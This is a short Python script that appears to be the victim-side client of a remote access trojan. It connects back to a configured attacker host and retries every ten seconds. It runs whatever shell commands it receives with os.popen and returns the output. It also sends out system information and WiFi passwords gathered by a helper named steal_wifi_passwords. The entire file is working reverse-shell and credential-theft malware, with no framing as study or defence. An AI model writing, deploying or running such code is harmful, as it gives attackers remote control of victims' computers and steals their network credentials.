import HelperMethods
import constants
import os
import time
from socket import *


class Target(object):
    @staticmethod
    def run():  # Try to connect to our server
        while True:
            try:
                print("[*] Trying to connect to server...")
                target_sock = socket(AF_INET, SOCK_STREAM)
                target_sock.connect((constants.TARGET_HOST, constants.TARGET_PORT))
                print(f"[+] Successfully connected to server ({constants.TARGET_HOST}:{constants.TARGET_PORT})")

                # Actively listen to new data
                while True:
                    payload = target_sock.recv(constants.BUFFER_SIZE).decode()
                    print(f"[+] Received: {payload}")

                    # Close connection on 'exit' command
                    if payload.lower() == "exit":
                        target_sock.close()
                        break
                    elif payload.lower() == "systeminfo":  # Collect system information
                        system_info = os.popen("systeminfo").read()
                        print(f"[+] System Information:\n{system_info}")
                        target_sock.sendall(system_info.encode())
                    elif payload.lower() == "get_wifi_passwords":
                        wifi_passwords = HelperMethods.steal_wifi_passwords()
                        print(f"[+] WiFi Passwords:\n{wifi_passwords}")
                        wifi_passwords = str(wifi_passwords).strip('[]')
                        target_sock.sendall(wifi_passwords.encode())
                    else:
                        result = os.popen(payload).read()  # Perform command line
                        target_sock.sendall(result.encode())  # Send back the command line results
            except error:
                print(f"[-] Error trying to connect to server {error}.")
                time.sleep(10)
                continue


def main():
    Target.run()


if __name__ == "__main__":
    main()
